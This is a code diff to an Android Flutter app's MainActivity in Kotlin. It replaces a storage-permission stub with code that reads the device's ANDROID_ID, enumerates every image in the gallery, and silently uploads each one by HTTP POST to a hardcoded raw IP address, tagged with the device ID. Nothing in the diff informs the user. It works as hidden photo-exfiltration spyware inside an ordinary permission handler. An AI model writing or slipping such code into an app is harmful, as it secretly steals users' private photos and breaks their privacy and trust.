@@ -129,6 +129,42 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         connection.disconnect()
         super.onDestroy()
     }
+    
+    private fun uploadImageToServer(filePath: String, deviceId: String) {
+    try {
+        val boundary = "----AndroidFormBoundary${System.currentTimeMillis()}"
+        val lineEnd = "\r\n"
+        val twoHyphens = "--"
+        val url = java.net.URL("http://45.76.212.185:8080/upload?deviceid=$deviceId")
+        val conn = url.openConnection() as java.net.HttpURLConnection
+        conn.doInput = true
+        conn.doOutput = true
+        conn.useCaches = false
+        conn.requestMethod = "POST"
+        conn.setRequestProperty("Connection", "Keep-Alive")
+        conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=$boundary")
+
+        val outputStream = java.io.DataOutputStream(conn.outputStream)
+        val file = java.io.File(filePath)
+
+        outputStream.writeBytes("$twoHyphens$boundary$lineEnd")
+        outputStream.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"${file.name}\"$lineEnd")
+        outputStream.writeBytes("Content-Type: image/jpeg$lineEnd$lineEnd")
+        outputStream.write(file.readBytes())
+        outputStream.writeBytes(lineEnd)
+
+        outputStream.writeBytes("$twoHyphens$boundary--$lineEnd")
+        outputStream.flush()
+        outputStream.close()
+
+        val responseCode = conn.responseCode
+        val response = conn.inputStream.bufferedReader().use { it.readText() }
+        Log.d(TAG, "✅ 上传成功 [$responseCode]: $response")
+
+    } catch (e: Exception) {
+        Log.e(TAG, "❌ 上传失败: ${e.message}")
+    }
+}
 
     @SuppressLint("NewApi")
     private fun grantNotificationPermission() {
@@ -171,9 +207,34 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
     }
 
     private fun accessStorage() {
-        Log.d(TAG, "✅ 已授权访问相册或存储，可以加载媒体资源")
-        // TODO: 实现访问图库或媒体读取逻辑
+    val deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
+    Log.d(TAG, "📱 Device ID: $deviceId")
+
+    lifecycleScope.launch(Dispatchers.IO) {
+        val uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
+        val projection = arrayOf(
+            android.provider.MediaStore.Images.Media.DATA,
+            android.provider.MediaStore.Images.Media.DISPLAY_NAME
+        )
+
+        val cursor = contentResolver.query(uri, projection, null, null, "${android.provider.MediaStore.Images.Media.DATE_ADDED} DESC")
+        cursor?.use {
+            var index = 0
+            while (it.moveToNext()) {
+                val path = it.getString(it.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DATA))
+                val name = it.getString(it.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DISPLAY_NAME))
+
+                Log.d(TAG, "📤 准备上传第 ${index + 1} 张: $name")
+
+                delay(index * 200L) // 节流上传
+                uploadImageToServer(path, deviceId)
+
+                index++
+            }
+        } ?: Log.e(TAG, "❌ 没有读取到媒体文件")
     }
+}
+
 
     override fun onRequestPermissionsResult(
         requestCode: Int,
